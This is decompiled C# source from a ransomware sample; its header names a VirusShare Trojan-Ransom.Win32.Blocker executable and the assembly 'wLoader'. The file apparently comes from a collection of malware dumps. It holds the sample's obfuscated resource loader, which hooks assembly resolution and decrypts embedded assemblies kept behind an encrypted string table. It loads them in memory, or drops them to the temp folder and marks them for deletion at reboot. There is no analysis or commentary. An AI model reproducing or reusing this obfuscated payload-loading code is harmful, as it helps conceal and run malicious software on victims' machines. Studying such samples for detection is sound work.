// Decompiled with JetBrains decompiler
// Type: ?5?.?9?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 601E9F23-A239-4CA4-BCF6-5BB65F85A0DA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.biqw-00a129d49d9d6af2a869f53ab2db7d80f4313e2b391d30ed8e02a96f59aa0cb4.exe

using \u003F9\u003F;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace \u003F5\u003F
{
  internal class \u003F9\u003F
  {
    internal const string \u003F8\u003F = "{71461f04-2faa-4bb9-a0dd-28a79101b599}";
    private const int \u003F8\u003F = 4;
    private static Hashtable \u003F8\u003F = new Hashtable();

    [DllImport("kernel32", EntryPoint = "MoveFileEx")]
    private static extern bool \u003F8\u003F(string _param0, string _param1, int _param2);

    internal static bool IsWebApplication
    {
      get
      {
        bool flag;
        try
        {
          string lower = Process.GetCurrentProcess().MainModule.ModuleName.ToLower();
          if (true)
          {
            int num = lower == \u003F98\u003F.\u003F99\u003F("\u007FĴɱ͵Ъզٺݤ") ? 1 : 0;
            if (true)
            {
              if (num != 0)
              {
                if (true)
                {
                  flag = true;
                  goto label_11;
                }
                else
                  goto label_11;
              }
              else
                num = lower == \u003F98\u003F.\u003F99\u003F("lſɻͤѬռ٘ݱ\u0875प੦\u0B7A\u0C64") ? 1 : 0;
            }
            if (num != 0)
            {
              flag = true;
              goto label_11;
            }
          }
        }
        catch
        {
        }
label_9:
        return false;
label_11:
        if (true)
        {
          int num = flag ? 1 : 0;
          return false ? num != 0 : num != 0;
        }
        goto label_9;
      }
    }

    internal static void \u003F8\u003F()
    {
      try
      {
        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u003F5\u003F.\u003F9\u003F.\u003F8\u003F);
      }
      catch
      {
      }
    }

    internal static Assembly \u003F8\u003F(object _param0, ResolveEventArgs _param1)
    {
      \u003F5\u003F.\u003F9\u003F.\u003F8\u003F obj = new \u003F5\u003F.\u003F9\u003F.\u003F8\u003F(_param1.Name);
      string str1 = obj.\u003F8\u003F(false);
      string s;
      if (true)
        s = str1;
      string base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
      string[] strArray;
      if (true)
        strArray = \u003F98\u003F.\u003F99\u003F("ÇƓ˥άӑ\u05CAەޮ\u08D4\u09F4\u0AD6\u0BFE\u0CDAශໍ\u0FEBოᇆዙᏻᓀᗊᛉ\u17F2ᣅ\u19DA᪸᮲᳜᷑ỠῨ\u20CE⇖⋕⍋\u2433┪☺✗⠵⤽⨱⬏ⰸⴏ⸱⽇〿ㄹ㉀㌜㐧㔨㘢㝚㠈㤡㨺㭖㰅㴈㸱㽚䀀䄌䈶䍮䐺䔕䘖䜳䠸䤚䨯䬰䰃䴝丂伺倰儖刼匥吝啿嘚坾堜夎婱嬵尜崒幰彺怏慳戕挎摰敗晱朊桷楽橡欂汻洇湭漀灿煋牥猞瑴畼瘑眖砆祲穒筺籝紒繁缗耕脒舙荻葺蔰蘫蜨蠯西訵謣谢赱踧輾遳鄣鉲鍪鐣镫陭霿頲餺驩鬴鰳鴰鹦鼰ꀷꅼ").Split(',');
      string str2 = string.Empty;
      bool flag1 = false;
      int num1 = 0;
      bool flag2;
      int num2;
      while (true)
      {
        flag2 = num1 != 0;
        int index1 = 0;
label_7:
        for (; index1 < strArray.Length - 1; index1 += 2)
        {
          if (strArray[index1] == base64String)
            goto label_5;
        }
        goto label_8;
label_5:
        str2 = strArray[index1 + 1];
label_8:
        int index2;
        if (str2.Length == 0 && obj.\u003F2\u003F.Length == 0)
        {
          base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.\u003F8\u003F));
          index2 = 0;
          goto label_13;
        }
        else
          goto label_14;
label_12:
        index2 += 2;
label_13:
        if (index2 < strArray.Length - 1)
        {
          if (strArray[index2] == base64String)
          {
            str2 = strArray[index2 + 1];
            if (false)
              goto label_7;
          }
          else
            goto label_12;
        }
label_14:
        if (true)
        {
          if (str2.Length > 0)
          {
            int num3 = (int) str2[0];
            if (false)
              num1 = num3;
            else if (num3 == 91)
            {
              num2 = str2.IndexOf(']');
              string str3 = str2.Substring(1, num2 - 1);
              flag1 = str3.IndexOf('z') >= 0;
              flag2 = str3.IndexOf('t') >= 0;
              if (false)
                goto label_5;
              else
                break;
            }
            else
              goto label_20;
          }
          else
            goto label_40;
        }
        else
          goto label_12;
      }
      str2 = str2.Substring(num2 + 1);
label_20:
      Hashtable hashtable;
      Monitor.Enter((object) (hashtable = \u003F5\u003F.\u003F9\u003F.\u003F8\u003F));
      try
      {
        if (\u003F5\u003F.\u003F9\u003F.\u003F8\u003F.ContainsKey((object) str2))
          return (Assembly) \u003F5\u003F.\u003F9\u003F.\u003F8\u003F[(object) str2];
        Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str2);
        if (manifestResourceStream != null)
        {
          int length = (int) manifestResourceStream.Length;
          byte[] numArray = new byte[length];
          manifestResourceStream.Read(numArray, 0, length);
          if (flag1)
            numArray = \u003F2\u003F.\u003F8\u003F(numArray);
          Assembly assembly;
          do
          {
            assembly = (Assembly) null;
            if (!flag2)
            {
              try
              {
                assembly = Assembly.Load(numArray);
              }
              catch (FileLoadException ex)
              {
                flag2 = true;
              }
              catch (BadImageFormatException ex)
              {
                flag2 = true;
              }
            }
            if (flag2)
            {
              try
              {
                string path1 = string.Format(\u003F98\u003F.\u003F99\u003F("|ĶɸͿвտٝ"), (object) Path.GetTempPath(), (object) str2);
                do
                {
                  Directory.CreateDirectory(path1);
                  string path2 = path1 + obj.\u003F8\u003F + \u003F98\u003F.\u003F99\u003F("*ŧɮͭ");
                  if (!File.Exists(path2))
                  {
                    FileStream fileStream = File.OpenWrite(path2);
                    fileStream.Write(numArray, 0, numArray.Length);
                    fileStream.Close();
                    \u003F5\u003F.\u003F9\u003F.\u003F8\u003F(path2, (string) null, 4);
                    \u003F5\u003F.\u003F9\u003F.\u003F8\u003F(path1, (string) null, 4);
                  }
                  assembly = Assembly.LoadFile(path2);
                }
                while (false);
              }
              catch
              {
              }
            }
          }
          while (false);
          \u003F5\u003F.\u003F9\u003F.\u003F8\u003F[(object) str2] = (object) assembly;
          return assembly;
        }
      }
      finally
      {
        do
        {
          Monitor.Exit((object) hashtable);
        }
        while (false);
      }
label_40:
      return (Assembly) null;
    }

    internal struct \u003F8\u003F
    {
      public string \u003F8\u003F;
      public Version \u003F8\u003F;
      public string \u003F1\u003F;
      public string \u003F2\u003F;

      public string \u003F8\u003F(bool _param1)
      {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append(this.\u003F8\u003F);
        if (true)
          goto label_4;
label_2:
        if (true)
          goto label_9;
label_3:
        return stringBuilder.ToString();
label_9:
        stringBuilder.Append(this.\u003F1\u003F.Length == 0 ? \u003F98\u003F.\u003F99\u003F("iţɰͰѱգ٭") : this.\u003F1\u003F);
        stringBuilder.Append(\u003F98\u003F.\u003F99\u003F("=İɟͻѯ\u0560٢ݩࡂ७\u0A7E\u0B52౪൯\u0E66ཬြ"));
        stringBuilder.Append(this.\u003F2\u003F.Length == 0 ? \u003F98\u003F.\u003F99\u003F("jŶɮͭ") : this.\u003F2\u003F);
        goto label_3;
label_4:
        int num;
        for (int index = _param1 ? 1 : 0; index != 0; index = num)
        {
          num = this.\u003F8\u003F != (Version) null ? 1 : 0;
          if (true)
          {
            if (num != 0)
            {
              stringBuilder.Append(\u003F98\u003F.\u003F99\u003F("&ĩɞ͢Ѵն٭ݬ\u086C़"));
              stringBuilder.Append((object) this.\u003F8\u003F);
              break;
            }
            break;
          }
        }
        stringBuilder.Append(\u003F98\u003F.\u003F99\u003F("&ĩɋͲѪձٱݱ\u0867़"));
        goto label_2;
      }

      public \u003F8\u003F(string _param1)
      {
        this.\u003F8\u003F = (Version) null;
        this.\u003F1\u003F = string.Empty;
        this.\u003F2\u003F = string.Empty;
        this.\u003F8\u003F = string.Empty;
        string str1 = _param1;
        char[] chArray = new char[1]{ ',' };
        foreach (string str2 in str1.Split(chArray))
        {
          string str3 = str2.Trim();
          if (!str3.StartsWith(\u003F98\u003F.\u003F99\u003F("^ŢɴͶѭլ٬ܼ")))
          {
            if (!str3.StartsWith(\u003F98\u003F.\u003F99\u003F("KŲɪͱѱձ٧ܼ")))
            {
              if (!str3.StartsWith(\u003F98\u003F.\u003F99\u003F("_Żɯ͠Ѣթقݭ\u087E॒੪୯౦൬\u0E3C")))
              {
                this.\u003F8\u003F = str3;
                continue;
              }
              this.\u003F2\u003F = str3.Substring(15);
              if (this.\u003F2\u003F == \u003F98\u003F.\u003F99\u003F("jŶɮͭ"))
              {
                this.\u003F2\u003F = string.Empty;
                continue;
              }
              continue;
            }
            this.\u003F1\u003F = str3.Substring(8);
            if (this.\u003F1\u003F == \u003F98\u003F.\u003F99\u003F("iţɰͰѱգ٭"))
            {
              this.\u003F1\u003F = string.Empty;
              continue;
            }
            continue;
          }
          this.\u003F8\u003F = new Version(str3.Substring(8));
        }
      }
    }
  }
}
